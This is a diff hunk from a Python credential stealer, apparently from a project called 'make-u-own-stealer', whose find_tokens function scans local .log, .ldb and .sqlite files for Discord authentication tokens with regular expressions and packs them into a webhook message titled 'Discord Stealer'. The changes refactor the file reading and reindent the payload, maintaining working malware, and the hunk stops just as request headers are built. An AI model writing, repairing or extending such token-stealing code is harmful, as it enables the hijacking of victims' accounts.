@@ -40,40 +40,40 @@ def find_tokens():
             for file_name in os.listdir(path):
                 if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                     with open(os.path.join(path, file_name), errors="ignore") as file:
-                        for line in file.readlines():
+                        for line in file:
                             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                 for token in re.findall(regex, line):
                                     if f"{token} | {platform}" not in tokens:
                                         tokens.append(token)
 
-    tokendata = {
-    "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
-    "username": "Prysmax Free",
-    "embeds": [
-        {
-      "title": "Discord Stealer",
-      "fields": [
-        {
-            "name": "Tokens Found",
-            "value": "\n".join(tokens),
+        tokendata = {
+        "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
+        "username": "Prysmax Free",
+        "embeds": [
+            {
+          "title": "Discord Stealer",
+          "fields": [
+            {
+                "name": "Tokens Found",
+                "value": "\n".join(tokens),
 
-        }
- 
-        ],
-      "image": {
-                "url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif",
-                "height": 0,
-                "width": 0
             }
-      }
-        
-    ],
-    "image": {
-        "url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif",
-        "height": 0,
-        "width": 0
+
+            ],
+          "image": {
+                    "url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif",
+                    "height": 0,
+                    "width": 0
+                }
+          }
+
+        ],
+        "image": {
+            "url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif",
+            "height": 0,
+            "width": 0
+        }
     }
-}
     headers = {
         "Content-Type": "application/json"
     }
